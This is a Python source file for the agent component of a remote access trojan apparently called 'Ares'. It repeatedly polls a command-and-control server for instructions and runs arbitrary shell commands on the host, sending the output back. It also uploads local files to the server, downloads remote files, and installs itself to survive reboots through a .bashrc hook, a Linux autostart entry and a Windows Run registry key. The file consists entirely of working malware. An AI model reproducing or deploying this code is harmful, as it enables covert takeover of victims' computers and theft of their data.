#!/usr/bin/env python
# coding: utf-8

import requests
import time
import os
import subprocess
import json
import base64
import platform
import shutil
import sys
import traceback
import threading
import uuid

import config


class Agent(object):

    def __init__(self):
        self.platform = platform.system() + " " + platform.release()
        self.idle = True
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()

    def log(self, to_log):
        """ Write data to agent log """
        print(to_log)

    def get_UID(self):
        return os.getlogin() + "_" + str(uuid.getnode())

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
            json={'platform': self.platform})
        return req.text

    def send_output(self, output, newlines=True):
        """ Send console output to server """
        if not output:
            return
        if newlines:
            output += "\n\n"
        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
        data={'output': output})

    def _runcmd(self, cmd):
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err).decode('utf8')
            self.send_output(output)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def runcmd(self, cmd):
        """ Run OS command """
        t = threading.Thread(target=self._runcmd, args=(cmd,))
        t.start()

    def cd(self, directory):
        """ Change current directory """
        os.chdir(os.path.expandvars(os.path.expanduser(directory)))

    def _upload(self, file):
        """ Uploads local file to server """
        file = os.path.expandvars(os.path.expanduser(file))
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("Uploading %s..." % file)
                requests.post(config.SERVER + '/api/' + self.uid + '/upload',
                    files={'uploaded': open(file, 'rb')})
            else:
                self.send_output('No such file: ' + file)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def upload(self, file):
        t = threading.Thread(target=self._upload, args=(file,))
        t.start()

    def _download(self, file, destination):
        try:
            if not destination:
                destination= file.split('/')[-1]
            self.send_output("Downloading %s..." % file)
            req = requests.get(file, stream=True)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("File downloaded: " + destination)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def download(self, file, destination=''):
        """ Download file through HTTP """      
        t = threading.Thread(target=self._download, args=(file, destination))
        t.start()

    def clean(self, silent=False):
        """ Uninstalls the agent and exits """ 
        if platform.system() == 'Linux':
            persist_dir = os.path.expanduser('~/.ares')
            if os.path.exists(persist_dir):
                shutil.rmtree(persist_dir)
            desktop_entry = os.path.expanduser('~/.config/autostart/ares.desktop')
            if os.path.exists(desktop_entry):
                os.remove(desktop_entry)
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
            if os.path.exists(persist_dir):
                shutil.rmtree(persist_dir)
            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
            subprocess.Popen(cmd, shell=True)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s\"" % persist_dir
            subprocess.Popen(cmd, shell=True)
        if not silent:
            self.send_output('Agent removed successfully.')
        

    def persist(self, silent=False):
        if not getattr(sys, 'frozen', False):
            if not silent:
                self.send_output('Persistence only supported on compiled agents.')
            return
        if self.is_installed():
            if not silent:
                self.send_output('Agent seems to be already installed.')
            return
        if platform.system() == 'Linux':
            persist_dir = os.path.expanduser('~/.ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            os.system('chmod +x ' + agent_path)
            if os.path.exists(os.path.expanduser("~/.config/autostart/")):
                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
                with open(os.path.expanduser('~/.config/autostart/ares.desktop'), 'w') as f:
                    f.write(desktop_entry)
            else:
                with open(os.path.expanduser("~/.bashrc"), "a") as f:
                    f.write("\nif [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&\n")
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
            subprocess.Popen(cmd, shell=True)
        if not silent:
            self.send_output('Agent installed.')

    def get_install_dir(self):
        install_dir = None
        if platform.system() == 'Linux':
            install_dir = os.path.expanduser('~/.ares')
        elif platform.system() == 'Windows':
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
        if os.path.exists(install_dir):
            return install_dir
        else:
            return None

    def is_installed(self):
        return self.get_install_dir()

    def get_consecutive_failed_connections(self):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            if os.path.exists(check_file):
                with open(check_file, "r") as f:
                    return int(f.read())
            else:
                return 0
        else:
            return self.failed_connections

    def update_consecutive_failed_connections(self, value):
        if self.is_installed():
            install_dir = self.get_install_dir()
            check_file = os.path.join(install_dir, "failed_connections")
            with open(check_file, "w") as f:
                f.write(str(value))
        else:
            self.failed_connections = value

    def exit(self):
        sys.exit(0)

    def run(self):
        """ Main loop """
        try:
            self.persist(silent=True)
        except:
            self.log("Failed executing persistence")
        while True:
            try:
                todo = self.server_hello()
                # Something to do ?
                if todo:
                    commandline = todo
                    self.idle = False
                    self.last_active = time.time()
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == 'cd':
                            if not args:
                                self.send_output('usage: cd </path/to/directory>')
                            else:
                                self.cd(args[0])
                        elif command == 'upload':
                            if not args:
                                self.send_output('usage: upload <localfile>')
                            else:
                                self.upload(args[0],)
                        elif command == 'download':
                            if not args:
                                self.send_output('usage: download <remote_url> <destination>')
                            else:
                                if len(args) == 2:
                                    self.download(args[0], args[1])
                                else:
                                    self.download(args[0])
                        elif command == 'clean':
                            self.clean()
                        elif command == 'persist':
                            self.persist()
                        elif command == 'exit':
                            self.exit()
                        else:
                            self.runcmd(commandline)
                    except Exception as exc:
                        self.send_output(traceback.format_exc())
                else:
                    if self.idle:
                        time.sleep(config.HELLO_INTERVAL)
                    elif (time.time() - self.last_active) > config.IDLE_TIME:
                        self.log("Switching to idle mode...")
                        self.idle = True
                    else:
                        time.sleep(0.5)
            except Exception as exc:
                self.log(traceback.format_exc())
                failed_connections = self.get_consecutive_failed_connections()
                failed_connections += 1
                self.update_consecutive_failed_connections(failed_connections)
                print "Consecutive failed connections: %d" % failed_connections
                if failed_connections > config.MAX_FAILED_CONNECTIONS:
                    self.clean(silent=True)
                    self.exit()
                time.sleep(config.HELLO_INTERVAL)

def main():
    agent = Agent()
    agent.run()


if __name__ == "__main__":
    main()
